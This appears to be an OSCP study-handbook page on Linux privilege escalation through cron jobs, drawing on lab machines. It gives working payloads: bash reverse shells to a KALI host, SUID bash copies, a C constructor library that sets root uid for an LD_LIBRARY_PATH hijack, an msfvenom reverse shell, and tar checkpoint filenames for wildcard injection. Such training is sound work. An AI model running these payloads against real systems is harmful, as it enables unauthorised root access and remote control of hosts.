---
title: "Cron Jobs"
slug: cron-jobs
category: notes
handbook: oscp
tags: ["privilege-escalation", "linux"]
draft: false
pubDatetime: 2026-07-18T17:48:53+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "Scheduled jobs run on a timer, often as root."
---
Scheduled jobs run on a timer, often as root. If a job runs a file that a low-privilege user can influence, that user's code runs with the job's privileges. This is a common Linux privilege escalation path after a web-user foothold.

## Enumerate

Read the system crontabs and drop-in directories:

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/
cat /etc/cron.d/*
```

Per-user crontabs, when readable:

```bash
crontab -l
ls -la /var/spool/cron/crontabs/ 2>/dev/null
```

`/etc/crontab` and `/etc/cron.d/` hold only the system crontabs. A job added with root's own `crontab -e` is stored per-user in `/var/spool/cron/crontabs/root`, which is mode `600 root` and unreadable to a low-privilege user, so it appears in none of the readable sources. This is why a job can clearly run as root on a schedule while every crontab a foothold user can read looks empty, as on Flu and Ochima. When a script clearly exists to be run by root but no crontab is visible, watch the process list instead of assuming.

A job that writes something leaves the evidence in the filesystem, and that is often what surfaces first. A root-owned file in a low-privilege user's home directory cannot have been put there by the user who owns the directory, and a recent timestamp on it means the writer is still running on a schedule. Both facts are readable without catching the job in the act, and both point straight at pspy. On Ochima a root-owned `etc_backup.tar` in `snort`'s home was the whole tell, an hour before the cron job that wrote it was found.

Watch for short-lived root processes with [pspy](/collections/oscp/pspy). Transfer the static binary and run it long enough to catch a periodic job:

```bash
timeout 60s /tmp/pspy
```

pspy shows commands as they run without needing root, which reveals cron jobs and their exact command lines and working directories. A minute of runtime is enough to catch a `* * * * *` job, and the command line points straight at the script to inspect.

A step schedule like `*/5 * * * *` fires on absolute wall-clock marks (`:00`, `:05`, `:10`...), not N minutes after whenever a payload happened to be dropped. This doesn't cost any actual wait time: the longest possible gap between an arbitrary starting point and the next tick is one full period, and that only happens if the starting point already sits exactly on a tick, so waiting a full period always covers at least one. It matters for reading pspy's timestamps against the clock rather than against when a file was last touched.

This is the path when linpeas and the readable crontabs turn up nothing. A root job whose schedule lives in a system crontab that the current user cannot read is invisible to enumeration but still shows up in pspy as a root (UID=0) process on each tick.

## Abuse a Writable Target

The job is only useful if part of what it runs is writable. Check ownership against write permission for every file in the chain:

```bash
ls -la /path/to/script.sh
```

Two cases to look for:

- The scheduled script itself is writable.
- The scheduled script is root-owned and not writable, but it calls another script that is writable.

The second case is what Sar had. A root-owned `finally.sh` ran `./write.sh`, and `write.sh` was world-writable (`rwxrwxrwx`):

```text
-rwxr-xr-x 1 root     root     finally.sh   # runs ./write.sh, not writable
-rwxrwxrwx 1 www-data www-data write.sh     # writable, runs as root on schedule
```

Overwrite the writable script with a payload and wait for the job to fire:

```sh
#!/bin/bash
bash -i >& /dev/tcp/KALI/80 0>&1
```

Match the payload to the interpreter that runs the script. A `#!/bin/sh` script on Debian or Ubuntu runs under dash, which does not support `>&`. See [Reverse Shells](/collections/oscp/reverse-shells).

When the writable target is the scheduled script itself and it does real work (a backup, a log rotation named like `/opt/log-backup.sh`), appending one line is enough and keeps the script's normal behaviour so nothing looks broken. Flu was exactly this: a root per-minute `/opt/log-backup.sh` writable by the foothold user. Ochima repeated it with `/var/backups/etc_Backup.sh`.

```bash
echo 'sh -i >& /dev/tcp/KALI/4444 0>&1' >> /opt/log-backup.sh
```

`sh -i >& /dev/tcp/...` relies on the script running under bash; on a `#!/bin/sh` Debian script it runs under dash and needs a dash-safe payload instead. Start `nc -nlvp 4444` first and wait for the next tick. The shell comes back as root.

A copied SUID shell is the better default here. It needs no listener and no outbound connectivity from the target, so it still works when egress is filtered; and because the payload is idempotent, the job firing again before the first result is used just re-copies harmlessly instead of dropping a second connection into a listener that then has to be cleaned up. It also leaves the real `/bin/bash` untouched, since the copy is what gets the SUID bit, not the system binary.

Put the copy somewhere on the main filesystem, not `/tmp`, since `/tmp` on a hardened target can make this fail with no visible error at all, in two different ways:

- **`nosuid` mount**: `cp` and `chmod u+s` both report success, `ls -la` shows the `s`, but the kernel drops the set-uid bit at exec time. The file exists; running it just returns a normal shell as whoever ran it. `findmnt -T /tmp` shows this directly.
- **A private `/tmp`**: a service can run inside a systemd `PrivateTmp` mount namespace, giving it a `/tmp` no other process on the box can see. A payload writing to `/tmp` from inside such a job produces a file that never appears anywhere checkable from the foothold, no matter how long the wait. Law hit this: `/tmp/rootbash` never existed even after a full minute's wait and several more confirmed cron ticks past it, despite the payload being appended correctly and the job confirmed firing every minute via pspy. Harder to verify directly from a foothold outside the job itself (`systemctl show cron.service -p PrivateTmp` if the unit file is readable), so treat a payload that never lands in `/tmp`, with everything else checking out, as this case rather than assuming the payload itself is wrong.

A directory the foothold is already writable in (a web root, a writable script's own directory) sidesteps both, since it sits on the real filesystem and is shared with every other process on the box:

```sh
cp /bin/bash /var/www/rootbash; chmod u+s /var/www/rootbash
```

Then after the job runs:

```bash
/var/www/rootbash -p
```

`-p` is required: bash drops the setuid privilege on start unless told to keep it.

A scheduled job does not have to be a shell script to be a writable target. A framework's own task runner counts too: Laravel deploys typically wire a single `* * * * * php artisan schedule:run` cron line, and the individual jobs live as PHP classes registered in code, not as separate crontab entries. The class file behind a scheduled Artisan command is still just a file, and whoever owns the webroot can usually write it. On LaVita pspy caught `php artisan clear:pictures` running as a non-root app user; overwriting the command's own PHP source with a reverse shell and waiting for the next tick caught a shell as that user. The landing user does not have to be root either, an intermediate account gained this way can be worth exactly as much as the sudo or file access it turns out to have.

## Writable Input Instead of a Writable Script

A job can be exploitable with nothing in its command chain writable. If it processes files from a directory that a low-privilege user can write to, the input is the attack surface, and the target is whatever tool the job runs over those files. Version that tool and search it.

The recurring case is an image or document processor pointed at an uploads directory. Exfiltrated ran this every minute as root:

```sh
IMAGES='/var/www/html/subrion/uploads'
ls $IMAGES | grep "jpg" | while read filename; do
  exiftool "$IMAGES/$filename" >> $LOGFILE
done
```

The script is root-owned and unwritable, so the standard overwrite is out, but `www-data` writes to `$IMAGES`, and the installed exiftool was old enough for [ExifTool DjVu Injection](/collections/oscp/exiftool-djvu-injection) to give root. Note the `grep` filter: the payload has to be named so the job actually picks it up. The same reasoning covers `tar`, `ffmpeg`, `convert`, and anything else fed untrusted files on a schedule.

## Relative Paths and PATH

When a root cron job calls a command or script by a relative name (`./write.sh`, or just `backup`), the file it resolves to depends on the job's working directory or `PATH`. If either points somewhere writable, a file with that name hijacks the call. `finally.sh` calling `./write.sh` is the working-directory case: the job's directory held the writable script.

`/etc/crontab` can also set its own `PATH`, and it is sometimes ordered badly:

```text
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root overwrite.sh
```

Here `/home/user` (writable) comes first, and `overwrite.sh` is called without an absolute path. A matching executable in `/home/user` runs as root on schedule:

`/usr/local/bin` and `/usr/local/sbin` are a common writable case with no deliberate misconfiguration behind them: Debian ships both group-writable to `staff` by policy, so that trusted non-root users can install local software, and this alone is enough if the current user is a `staff` member and a root cron job resolves any bare command through that `PATH` entry. lse's `ret060`-style flags on these two paths specifically are worth checking `id` for `staff` membership before looking for anything more unusual. Roquefort's `*/5 * * * * root cd / && run-parts --report /etc/cron.hourly` line, easy to read as the Debian run-parts boilerplate, was exploitable purely because of this.

```bash
cat > /home/user/overwrite.sh <<'EOF'
#!/bin/bash
cp /bin/bash /home/user/rootbash; chmod +s /home/user/rootbash
EOF
chmod +x /home/user/overwrite.sh
# after the job fires:
/home/user/rootbash -p
```

The hijack file needs its execute bit set and, if it has no shebang, gets reinterpreted by whatever shell the caller uses, which can hit the dash `>&` trap in [Reverse Shells](/collections/oscp/reverse-shells). On Roquefort the payload sat without `chmod +x` for a full cycle first, so nothing fired.

Waiting on the real cron tick to test each fix is slow. Run the dropped file directly, as yourself, before waiting on cron again:

```bash
/usr/local/bin/overwrite.sh
```

This isolates the failure domain in one shot. An immediate `Permission denied` or nothing at all means exec itself is broken (missing `+x`, or the directory is mounted `noexec`, check with `findmnt -T <dir>`). The command returning immediately with no callback means the payload logic is wrong. The command hanging is actually the good sign: the script is running and trying to connect out, so the file itself is fine and the remaining problem is the network, not the exploit. On Roquefort this hang was the tell that the payload was correct and the callback port (`80`) was the thing being blocked; switching to `22` connected. See [Reverse Shells](/collections/oscp/reverse-shells#choosing-the-callback-port).

## LD_LIBRARY_PATH in a Job's Environment

`PATH` isn't the only environment variable a crontab can set that turns into a hijack. `/etc/crontab` and per-job env blocks can also declare `LD_LIBRARY_PATH`, and if a root job runs a binary that dynamically links against a library living in a directory that value points at, a low-privilege user writing a same-named library there gets it loaded into the job's process. Same underlying mechanism as [Sudo](/collections/oscp/sudo#ld_library_path) (constructor payload, matching soname, `LD_LIBRARY_PATH` pointed at the writable directory), just triggered by a crontab's own declared environment instead of `sudo`'s `env_keep`. It does not apply to SUID binaries ([SUID Binaries](/collections/oscp/suid-binaries#why-not-ld_preload-here)), but a root cron job is not a SUID binary, it's root's own process, so the dynamic linker honors the variable normally.

The tell is a non-standard entry sitting next to the normal ones:

```text
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
* * * * * root /usr/bin/log-sweeper
```

`/usr/lib` and `/usr/lib64` are unremarkable; the other two aren't anywhere a distro puts anything by default, which means someone added them because the job's own binary needs a library that isn't in a standard path. `lse`'s `ret060` flags a writable path here the same way it does for the `PATH` case above, but confirming there's a job that actually resolves through it still means reading the crontab by hand.

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void hijack() __attribute__((constructor));
void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("cp /bin/bash /home/user/rootbash; chmod u+s /home/user/rootbash");
}
```

```bash
gcc -shared -fPIC -o /usr/local/lib/dev/utils.so payload.c
# wait for the next tick, then:
/home/user/rootbash -p
```

The library name has to match exactly what the target binary is missing, running it directly as the low-priv user (`error while loading shared libraries: utils.so: cannot open shared object file`) names it for free. Sybaris had this exactly: `log-sweeper` missing `utils.so`, `/usr/local/lib/dev` world-writable, root's own `*/5 * * * *`-style minute tick loading the dropped library and creating a SUID bash copy.

## Wildcard Injection

When a root cron script runs a command with a wildcard (`*`) in a writable directory, filename expansion turns crafted filenames into command-line options. The shell expands `*` to the file list before the command runs, so files named like flags are passed as flags.

```sh
# /usr/local/bin/compress.sh, run by root
cd /home/user
tar czf /tmp/backup.tar.gz *
```

`tar` has a `--checkpoint` feature that can execute a command. Create files whose names are those options, alongside a payload:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI LPORT=53 -f elf -o shell.elf
# in the wildcard directory:
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=shell.elf
```

When the cron job runs `tar ... *`, the two files expand into `--checkpoint=1 --checkpoint-action=exec=shell.elf`, and the payload runs as root. Catch it with `nc -nvlp 53`. GTFOBins shows which commands have wildcard-abusable options (`tar`, `chown --reference`, `rsync -e`, and others).
